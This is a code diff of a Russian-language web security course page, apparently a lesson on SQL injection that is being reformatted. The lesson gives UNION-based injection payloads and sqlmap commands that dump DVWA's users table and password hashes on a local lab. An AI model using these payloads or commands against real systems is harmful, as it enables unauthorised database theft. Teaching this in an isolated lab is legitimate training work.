@@ -42,9 +42,9 @@ export default function Module1Lesson4Page() {
         <CardContent>
           <P>Перед началом убедитесь, что у вас настроены и запущены:</P>
           <Ul items={[
-            <><strong>Damn Vulnerable Web Application (DVWA):</strong> Развернуто через Docker, как описано в Уроке 2. Убедитесь, что вы можете войти в систему (admin/password) и менять уровни безопасности<Link href="#source-1" className={LinkStyle}><sup className="align-super text-xs">1</sup></Link>.</>,
-            <><strong>OWASP Juice Shop:</strong> Развернуто через Docker, как описано в Уроке 3. Убедитесь, что приложение доступно<Link href="#source-4" className={LinkStyle}><sup className="align-super text-xs">4</sup></Link>.</>,
-            "<strong>Burp Suite Community Edition:</strong> Установлен и настроен для перехвата трафика браузера, как описано в Уроке 1.",
+            <><strong>Damn Vulnerable Web Application (DVWA):</strong> Развернуто через Docker, как описано в <Link href="/guidelines/module-1/lesson-2" className={LinkStyle}>Уроке 1.2</Link>. Убедитесь, что вы можете войти в систему (admin/password) и менять уровни безопасности<Link href="#source-1" className={LinkStyle}><sup className="align-super text-xs">1</sup></Link>.</>,
+            <><strong>OWASP Juice Shop:</strong> Развернуто через Docker, как описано в <Link href="/guidelines/module-1/lesson-3" className={LinkStyle}>Уроке 1.3</Link>. Убедитесь, что приложение доступно<Link href="#source-4" className={LinkStyle}><sup className="align-super text-xs">4</sup></Link>.</>,
+            <><strong>Burp Suite Community Edition:</strong> Установлен и настроен для перехвата трафика браузера, как описано в <Link href="/guidelines/module-1/lesson-1" className={LinkStyle}>Уроке 1.1</Link>.</>,
             <><strong>SQLMap:</strong> Установлен. SQLMap – это мощный инструмент для автоматизации SQL-инъекций<Link href="#source-5" className={LinkStyle}><sup className="align-super text-xs">5</sup></Link>.</>,
             "<strong>Веб-браузер:</strong> С настроенным прокси для Burp Suite."
           ]} />
@@ -138,21 +138,21 @@ export default function Module1Lesson4Page() {
                       <>Введите: <CodeBlock code="1' ORDER BY 3--" /> (должна появиться ошибка, так как третьего столбца нет). Это означает, что исходный запрос возвращает 2 столбца<Link href="#source-16" className={LinkStyle}><sup className="align-super text-xs">16</sup></Link>.</>
                     ]} />
                   </>,
-                  <>Извлечение данных из таблицы <code className="font-mono text-sm bg-muted p-1 rounded">users</code>: Теперь мы можем попытаться извлечь данные. Мы знаем, что в DVWA есть таблица <code className="font-mono text-sm bg-muted p-1 rounded">users</code> со столбцами <code className="font-mono text-sm bg-muted p-1 rounded">user</code> (имя пользователя) и <code className="font-mono text-sm bg-muted p-1 rounded">password</code> (хэш пароля).
-                    <P><strong>Полезная нагрузка:</strong></P>
-                    <CodeBlock code="1' UNION SELECT user, password FROM users--" />
-                    <P>Введите эту полезную нагрузку в поле "User ID" и нажмите "Submit".</P>
-                    <P><strong>Ожидаемый результат:</strong> Вы должны увидеть список имен пользователей и их хешированных паролей из таблицы users, отображенных на странице<Link href="#source-15" className={LinkStyle}><sup className="align-super text-xs">15</sup></Link>.</P>
-                  </>,
-                  <>Объяснение:
-                    <Ul items={[
-                      <><CodeBlock code="1'" /> : Закрывает кавычку для user_id и завершает легитимное условие.</>,
-                      <><CodeBlock code="UNION SELECT user, password FROM users" />: Добавляет результаты нашего запроса (имена пользователей и пароли) к результатам исходного запроса.</>,
-                      <><CodeBlock code="--" />: Комментирует оставшуюся часть исходного SQL-запроса, чтобы избежать синтаксических ошибок.</>
-                    ]} />
-                  </>,
-                  <>(Опционально) Извлечение другой информации: Попробуйте извлечь версию базы данных: <CodeBlock code="1' UNION SELECT @@version, NULL--" />. <CodeBlock code="@@version" /> – переменная, часто содержащая версию СУБД (для MySQL)<Link href="#source-17" className={LinkStyle}><sup className="align-super text-xs">17</sup></Link>. NULL используется, так как нам нужно два столбца.</>
+                  <>Извлечение данных из таблицы <code className="font-mono text-sm bg-muted p-1 rounded">users</code>: Теперь мы можем попытаться извлечь данные. Мы знаем, что в DVWA есть таблица <code className="font-mono text-sm bg-muted p-1 rounded">users</code> со столбцами <code className="font-mono text-sm bg-muted p-1 rounded">user</code> (имя пользователя) и <code className="font-mono text-sm bg-muted p-1 rounded">password</code> (хэш пароля).</>,
                 ]} />
+                <P><strong>Полезная нагрузка:</strong></P>
+                <CodeBlock code="1' UNION SELECT user, password FROM users--" />
+                <P>Введите эту полезную нагрузку в поле "User ID" и нажмите "Submit".</P>
+                <P><strong>Ожидаемый результат:</strong> Вы должны увидеть список имен пользователей и их хешированных паролей из таблицы users, отображенных на странице<Link href="#source-15" className={LinkStyle}><sup className="align-super text-xs">15</sup></Link>.</P>
+                <P>Объяснение:</P>
+                <Ul items={[
+                    <><CodeBlock code="1'" /> : Закрывает кавычку для user_id и завершает легитимное условие.</>,
+                    <><CodeBlock code="UNION SELECT user, password FROM users" />: Добавляет результаты нашего запроса (имена пользователей и пароли) к результатам исходного запроса.</>,
+                    <><CodeBlock code="--" />: Комментирует оставшуюся часть исходного SQL-запроса, чтобы избежать синтаксических ошибок.</>
+                ]} />
+                <P>(Опционально) Извлечение другой информации: Попробуйте извлечь версию базы данных:</P>
+                <CodeBlock code="1' UNION SELECT @@version, NULL--" />
+                <P><CodeBlock code="@@version" /> – переменная, часто содержащая версию СУБД (для MySQL)<Link href="#source-17" className={LinkStyle}><sup className="align-super text-xs">17</sup></Link>. NULL используется, так как нам нужно два столбца.</P>
               </AccordionContent>
             </AccordionItem>
           </Accordion>
@@ -317,27 +317,24 @@ export default function Module1Lesson4Page() {
                 <Ul items={[
                   <>Получение списка баз данных: Используйте команду:
                     <CodeBlock language="bash" code={'sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=ВАШ_PHPSESSID; security=low" --dbs --batch'} />
-                    <P><strong>--dbs:</strong> Указывает SQLMap извлечь список доступных баз данных<Link href="#source-6" className={LinkStyle}><sup className="align-super text-xs">6</sup></Link>.</P>
-                    <P><strong>Ожидаемый результат:</strong> SQLMap выведет список баз данных, среди которых должна быть <code className="font-mono text-sm bg-muted p-1 rounded">dvwa</code>.</P>
                   </>,
-                  <>Получение списка таблиц из базы данных <code className="font-mono text-sm bg-muted p-1 rounded">dvwa</code>: Используйте команду:
-                    <CodeBlock language="bash" code={'sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=ВАШ_PHPSESSID; security=low" -D dvwa --tables --batch'} />
-                    <P><strong>-D dvwa:</strong> Указывает целевую базу данных.</P>
-                    <P><strong>--tables:</strong> Указывает SQLMap извлечь список таблиц из указанной БД<Link href="#source-6" className={LinkStyle}><sup className="align-super text-xs">6</sup></Link>.</P>
-                    <P><strong>Ожидаемый результат:</strong> SQLMap выведет список таблиц в базе <code className="font-mono text-sm bg-muted p-1 rounded">dvwa</code>, включая <code className="font-mono text-sm bg-muted p-1 rounded">users</code> и <code className="font-mono text-sm bg-muted p-1 rounded">guestbook</code>.</P>
-                  </>,
-                  <>Получение столбцов из таблицы <code className="font-mono text-sm bg-muted p-1 rounded">users</code>: Используйте команду:
-                    <CodeBlock language="bash" code={'sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=ВАШ_PHPSESSID; security=low" -D dvwa -T users --columns --batch'} />
-                    <P><strong>-T users:</strong> Указывает целевую таблицу.</P>
-                    <P><strong>--columns:</strong> Указывает SQLMap извлечь имена столбцов из указанной таблицы<Link href="#source-6" className={LinkStyle}><sup className="align-super text-xs">6</sup></Link>.</P>
-                    <P><strong>Ожидаемый результат:</strong> SQLMap выведет столбцы таблицы <code className="font-mono text-sm bg-muted p-1 rounded">users</code> (например, user_id, first_name, last_name, user, password).</P>
-                  </>,
-                  <>Извлечение (дамп) данных из таблицы <code className="font-mono text-sm bg-muted p-1 rounded">users</code>: Используйте команду:
-                    <CodeBlock language="bash" code={'sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=ВАШ_PHPSESSID; security=low" -D dvwa -T users --dump --batch'} />
-                    <P><strong>--dump:</strong> Указывает SQLMap извлечь все данные из указанной таблицы<Link href="#source-6" className={LinkStyle}><sup className="align-super text-xs">6</sup></Link>.</P>
-                    <P><strong>Ожидаемый результат:</strong> SQLMap выведет содержимое таблицы <code className="font-mono text-sm bg-muted p-1 rounded">users</code>, включая имена пользователей и хеши их паролей. SQLMap может предложить сохранить хеши для последующего взлома.</P>
-                  </>
-                ]} />
+                ]}/>
+                <P><strong>--dbs:</strong> Указывает SQLMap извлечь список доступных баз данных<Link href="#source-6" className={LinkStyle}><sup className="align-super text-xs">6</sup></Link>.</P>
+                <P><strong>Ожидаемый результат:</strong> SQLMap выведет список баз данных, среди которых должна быть <code className="font-mono text-sm bg-muted p-1 rounded">dvwa</code>.</P>
+                <P>Получение списка таблиц из базы данных <code className="font-mono text-sm bg-muted p-1 rounded">dvwa</code>: Используйте команду:</P>
+                <CodeBlock language="bash" code={'sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=ВАШ_PHPSESSID; security=low" -D dvwa --tables --batch'} />
+                <P><strong>-D dvwa:</strong> Указывает целевую базу данных.</P>
+                <P><strong>--tables:</strong> Указывает SQLMap извлечь список таблиц из указанной БД<Link href="#source-6" className={LinkStyle}><sup className="align-super text-xs">6</sup></Link>.</P>
+                <P><strong>Ожидаемый результат:</strong> SQLMap выведет список таблиц в базе <code className="font-mono text-sm bg-muted p-1 rounded">dvwa</code>, включая <code className="font-mono text-sm bg-muted p-1 rounded">users</code> и <code className="font-mono text-sm bg-muted p-1 rounded">guestbook</code>.</P>
+                <P>Получение столбцов из таблицы <code className="font-mono text-sm bg-muted p-1 rounded">users</code>: Используйте команду:</P>
+                <CodeBlock language="bash" code={'sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=ВАШ_PHPSESSID; security=low" -D dvwa -T users --columns --batch'} />
+                <P><strong>-T users:</strong> Указывает целевую таблицу.</P>
+                <P><strong>--columns:</strong> Указывает SQLMap извлечь имена столбцов из указанной таблицы<Link href="#source-6" className={LinkStyle}><sup className="align-super text-xs">6</sup></Link>.</P>
+                <P><strong>Ожидаемый результат:</strong> SQLMap выведет столбцы таблицы <code className="font-mono text-sm bg-muted p-1 rounded">users</code> (например, user_id, first_name, last_name, user, password).</P>
+                <P>Извлечение (дамп) данных из таблицы <code className="font-mono text-sm bg-muted p-1 rounded">users</code>: Используйте команду:</P>
+                <CodeBlock language="bash" code={'sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=ВАШ_PHPSESSID; security=low" -D dvwa -T users --dump --batch'} />
+                <P><strong>--dump:</strong> Указывает SQLMap извлечь все данные из указанной таблицы<Link href="#source-6" className={LinkStyle}><sup className="align-super text-xs">6</sup></Link>.</P>
+                <P><strong>Ожидаемый результат:</strong> SQLMap выведет содержимое таблицы <code className="font-mono text-sm bg-muted p-1 rounded">users</code>, включая имена пользователей и хеши их паролей. SQLMap может предложить сохранить хеши для последующего взлома.</P>
               </AccordionContent>
             </AccordionItem>
           </Accordion>
@@ -451,3 +448,4 @@ export default function Module1Lesson4Page() {
     </ContentPageLayout>
   );
 }
+
